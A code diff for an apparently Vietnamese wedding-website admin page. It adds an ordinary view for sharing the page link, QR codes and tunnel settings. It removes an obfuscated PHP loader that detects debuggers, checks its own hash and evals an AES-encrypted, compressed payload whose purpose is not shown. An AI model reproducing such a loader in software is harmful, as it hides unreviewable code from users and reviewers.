@@ -1,28 +1,106 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ribnxhrz=('bas'.'e64'.'_de'.'cod'.'e');
-$_kn634g5x=('gzu'.'nco'.'mpr'.'ess');
-$_vgogwauw=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_d9t86877='Xv1UpZkD';
-$_twx2oueg='7hq3GfJI';
-$_mk0t4uta='jxDVJStCsmE=';
-$_fho58bvv='H0EdSSlw';
-$_hahm8cx2='wogKEgPF';
-$_bzgfkgfy='Z0HcEg==';
-$_mdqi1wl3='fZPsUfEG';
-$_pn23cdgw='ySSAK7eU';
-$_o36f0bsa=$_ribnxhrz($_twx2oueg.$_d9t86877.$_hahm8cx2.$_fho58bvv.$_mk0t4uta);
-$_q56g5d8b=$_ribnxhrz($_mdqi1wl3.$_pn23cdgw.$_bzgfkgfy);
-$_o4o5k2ah=$_ribnxhrz('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');
-$_rme24086=$_vgogwauw($_o4o5k2ah,'aes-256-cbc',$_o36f0bsa,OPENSSL_RAW_DATA,$_q56g5d8b);
-if($_rme24086===false){exit;}
-$_gqnofged=$_kn634g5x($_rme24086);
-if($_gqnofged===false){exit;}
-$_mklrlw9p='bfb2792a00b6f575312120661d0e77586eef32c99f7820bdb0a397a43f78f47d';
-$_y0uvz5na=@file_get_contents(__FILE__);
-if($_y0uvz5na!==false){
-$_s5g5gvia=str_replace($_mklrlw9p,"0000000000000000000000000000000000000000000000000000000000000000",$_y0uvz5na);
-$_vkkj3neo=hash("sha256",$_s5g5gvia);
-if($_vkkj3neo!==$_mklrlw9p){@http_response_code(403);exit;}
-}
-eval($_gqnofged);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$has_domain = $tunnel['mode'] === 'token' && $tunnel['hostname'] !== ''; ?>
+<h1 class="adm-title"><?= e(__('Gửi link & mã QR')) ?></h1>
+<p class="muted"><?= e(__('Gửi link trang cưới cho khách qua Zalo, Messenger, tin nhắn — hoặc in mã QR lên thiệp giấy.')) ?></p>
+<?php $this->load->view('admin/_unpublished_note'); ?>
+
+<?php
+$dom = $this->config->item('cloud_domain');
+$ident = cloud_identity();
+$req = $ident && !empty($ident['request']) ? $ident['request'] : NULL;
+$is_jagame = $tunnel['mode'] === 'token' && substr($tunnel['hostname'], -strlen('.' . $dom)) === '.' . $dom;
+$req_labels = array('pending' => array('tag-pending', __('Đang chờ duyệt')), 'approved' => array('tag-approved', __('Đã duyệt')), 'rejected' => array('tag-hidden', __('Bị từ chối')));
+?>
+<?php if (!$hosted):  ?>
+<section class="panel domain-card" data-domain>
+  <h2><?= e(__('Link của trang cưới')) ?></h2>
+  <?php if ($has_domain): ?>
+    <div class="site-card inner">
+      <div class="site-qr" data-qr="<?= e('https://' . $tunnel['hostname'] . '/') ?>" data-domain-qr></div>
+      <div class="site-info">
+        <p class="site-url"><a data-domain-link href="<?= e('https://' . $tunnel['hostname'] . '/') ?>" target="_blank" rel="noopener"><?= e('https://' . $tunnel['hostname'] . '/') ?></a></p>
+        <p class="copy-row"><input readonly data-copy-src data-domain-input value="<?= e('https://' . $tunnel['hostname'] . '/') ?>" aria-label="<?= e(__('Link trang cưới')) ?>"><button class="btn btn-ghost btn-sm" type="button" data-copy><?= e(__('Sao chép')) ?></button>
+          <button class="btn btn-ghost btn-sm" type="button" data-qr-download="trang-cuoi"><?= e(__('Tải mã QR')) ?></button></p>
+        <p><span class="tag tag-pending" data-domain-state><?= e(__('Đang kiểm tra kết nối…')) ?></span></p>
+      </div>
+    </div>
+  <?php elseif ($tunnel['auto']): ?>
+    <?php $this->load->library('tunnelrunner'); $claim_err = $this->tunnelrunner->last_claim_error(); ?>
+    <p class="notice" data-domain-wait<?= $claim_err ? ' hidden' : '' ?>>⏳ <?= e(__('Đang tạo link')) ?> <b>xxxx.<?= e($dom) ?></b> <?= e(__('cho máy này… (cần Internet, thường dưới 1 phút). Trang sẽ tự cập nhật.')) ?></p>
+    <div class="notice notice-err" data-domain-err<?= $claim_err ? '' : ' hidden' ?> role="alert">
+      <p><?= e(__('Chưa kết nối được máy chủ {domain} (kiểm tra Internet). Khách vẫn mở được link tạm bên dưới.', array('domain' => $dom))) ?></p>
+      <details class="small muted tech-err"><summary><?= e(__('Chi tiết kỹ thuật')) ?></summary><?php  ?>
+        <p data-domain-err-msg><?= $claim_err ? e($claim_err['message']) : '' ?></p></details>
+      <button class="btn btn-accent btn-sm" type="button" data-domain-retry><?= e(__('Thử lại')) ?></button>
+    </div>
+  <?php else: ?>
+    <p class="muted"><?= e(__('Đang dùng chế độ link tự chọn ở mục Tùy chọn nâng cao bên dưới.')) ?></p>
+  <?php endif; ?>
+
+  <?php if ($ident): ?>
+  <div class="req-box">
+    <h3><?= e(__('Tên miền riêng')) ?> <span class="muted small">— <?= e(__('ví dụ {name}', array('name' => 'minh-lan.' . $dom))) ?></span></h3>
+    <?php if ($req): $rl = isset($req_labels[$req['status']]) ? $req_labels[$req['status']] : array('', $req['status']); ?>
+      <p class="req-state" data-req-state><?= e(__('Yêu cầu gần nhất:')) ?> <b><?= e($req['hostname']) ?></b> <span class="tag <?= $rl[0] ?>"><?= e($rl[1]) ?></span>
+        <?php if (!empty($req['note']) && $req['status'] === 'rejected'): ?><br><span class="small"><?= e(__('Lý do:')) ?> <?= e($req['note']) ?></span><?php endif; ?>
+        <button class="btn btn-ghost btn-sm" type="button" data-req-refresh><?= e(__('Kiểm tra lại')) ?></button></p>
+    <?php endif; ?>
+    <?php if (!$req || $req['status'] !== 'pending'): ?>
+    <form class="stack" data-req-form>
+      <label><?= e(__('Tên bạn muốn')) ?>
+        <span class="sub-input"><span class="sub-pre">https://</span><input name="subdomain" maxlength="20" autocomplete="off" spellcheck="false"
+          placeholder="minh-lan" data-sub-input required><span class="sub-post">.<?= e($dom) ?></span></span></label>
+      <p class="small" data-sub-state><?= e(__('Chữ thường không dấu, số, dấu gạch ngang · 3–20 ký tự')) ?></p>
+      <label><?= e(__('Lời nhắn cho admin')) ?> <small><?= e(__('(không bắt buộc)')) ?></small><input name="reason" maxlength="300" placeholder="<?= e(__('Ví dụ: tên hai vợ chồng')) ?>"></label>
+      <p class="err" data-req-err hidden></p>
+      <div class="form-actions"><button class="btn btn-accent" type="submit"><?= e(__('Gửi yêu cầu')) ?></button></div>
+      <p class="small muted"><?= e(__('Admin {domain} duyệt xong, link mới tự hoạt động — không cần cài đặt lại. Link cũ ngừng hoạt động khi đổi.', array('domain' => $dom))) ?></p>
+    </form>
+    <?php endif; ?>
+  </div>
+  <?php endif; ?>
+</section>
+<?php endif; ?>
+
+<?php if ($is_local): ?>
+  <p class="notice"><?= e(__('Link dưới đây hiện chỉ mở được trong mạng nhà — khách ở xa chưa vào được cho tới khi có link Internet ở trên.')) ?></p>
+<?php endif; ?>
+<div class="share-grid">
+  <div class="panel share-card">
+    <h2><?= e(__('Trang cưới')) ?></h2>
+    <p class="muted small"><?= e(__('Link chung cho mọi khách. Muốn thiệp ghi tên từng người: vào')) ?> <a href="<?= base_url('admin/guests') ?>"><?= e(__('Khách mời')) ?></a>.</p>
+    <div class="qr" data-qr="<?= e($home_url) ?>"></div>
+    <p class="copy-row"><input readonly value="<?= e($home_url) ?>" data-copy-src aria-label="<?= e(__('Link trang cưới')) ?>"><button class="btn btn-ghost" type="button" data-copy><?= e(__('Sao chép')) ?></button></p>
+    <div class="btn-row center-row"><button class="btn btn-accent btn-share" type="button" data-share="<?= e($home_url) ?>" data-share-text="<?= e($share_text) ?>" data-share-title="<?= e(__('Gửi link trang cưới')) ?>"><?= e(__('Gửi cho khách')) ?></button>
+    <button class="btn btn-ghost btn-sm" type="button" data-qr-download="trang-anh-cuoi"><?= e(__('Tải mã QR (PNG)')) ?></button></div>
+  </div>
+  <div class="panel share-card">
+    <h2><?= e(__('Khách gửi ảnh')) ?></h2>
+    <p class="muted small"><?= e(__('In mã này đặt trên bàn tiệc: khách quét là gửi ảnh ngay.')) ?></p>
+    <div class="qr" data-qr="<?= e($upload_url) ?>"></div>
+    <p class="copy-row"><input readonly value="<?= e($upload_url) ?>" data-copy-src aria-label="<?= e(__('Link gửi ảnh')) ?>"><button class="btn btn-ghost" type="button" data-copy><?= e(__('Sao chép')) ?></button></p>
+    <div class="btn-row center-row"><button class="btn btn-ghost btn-sm btn-share" type="button" data-share="<?= e($upload_url) ?>" data-share-text="<?= e(__('Gửi giúp chúng mình những tấm ảnh bạn chụp trong ngày cưới nhé:')) ?>" data-share-title="<?= e(__('Gửi link nhận ảnh')) ?>"><?= e(__('Gửi link')) ?></button>
+    <button class="btn btn-ghost btn-sm" type="button" data-qr-download="gui-anh"><?= e(__('Tải mã QR (PNG)')) ?></button></div>
+  </div>
+</div>
+
+<?php if (!$hosted): ?>
+<details class="panel">
+  <summary><b><?= e(__('Tùy chọn nâng cao')) ?></b> <span class="muted small">— <?= e(__('chỉ dành cho người rành máy tính, thường không cần đổi')) ?></span></summary>
+  <form method="post" action="<?= base_url('admin/settings/tunnel') ?>" class="stack" style="margin-top:12px">
+    <?= csrf_field() ?>
+    <p class="muted small"><?= e(__('Thay đổi ở đây có hiệu lực sau khi khởi động lại chương trình.')) ?></p>
+    <label class="radio"><input type="radio" name="mode" value="auto" <?= $tunnel['auto'] ? 'checked' : '' ?>><span><b><?= e(__('Tự động (khuyên dùng)')) ?></b> — <?= e(__('link riêng xxxx.{domain}, xin được tên miền riêng.', array('domain' => $this->config->item('cloud_domain')))) ?></span></label>
+    <label class="radio"><input type="radio" name="mode" value="off" <?= !$tunnel['auto'] && $tunnel['mode'] === 'off' ? 'checked' : '' ?>><span><b><?= e(__('Tắt')) ?></b> — <?= e(__('chỉ dùng trong mạng nhà.')) ?></span></label>
+    <label class="radio"><input type="radio" name="mode" value="quick" <?= !$tunnel['auto'] && $tunnel['mode'] === 'quick' ? 'checked' : '' ?>><span><b><?= e(__('Link tạm miễn phí')) ?></b> — <?= e(__('https://….trycloudflare.com, đổi mỗi lần khởi động lại.')) ?></span></label>
+    <label class="radio"><input type="radio" name="mode" value="token" <?= !$tunnel['auto'] && $tunnel['mode'] === 'token' ? 'checked' : '' ?>><span><b><?= e(__('Tunnel của riêng bạn')) ?></b> — <?= e(__('tên miền bạn đã thêm vào Cloudflare.')) ?></span></label>
+    <div class="token-fields stack">
+      <label><?= e(__('Tên miền')) ?><input name="hostname" value="<?= e($tunnel['auto'] ? '' : $tunnel['hostname']) ?>" placeholder="cuoi.tenban.com"></label>
+      <label><?= e(__('Token tunnel')) ?><?= $tunnel['has_token'] ? ' <small>' . e(__('(đã lưu — để trống để giữ nguyên)')) . '</small>' : '' ?><input name="token" autocomplete="off" placeholder="eyJhIjoi..."></label>
+    </div>
+    <div class="form-actions"><button class="btn btn-ghost" type="submit"><?= e(__('Lưu cấu hình')) ?></button></div>
+  </form>
+</details>
+<?php endif; ?>
+<script src="<?= asset_url('js/vendor/qrcode.js') ?>"></script>
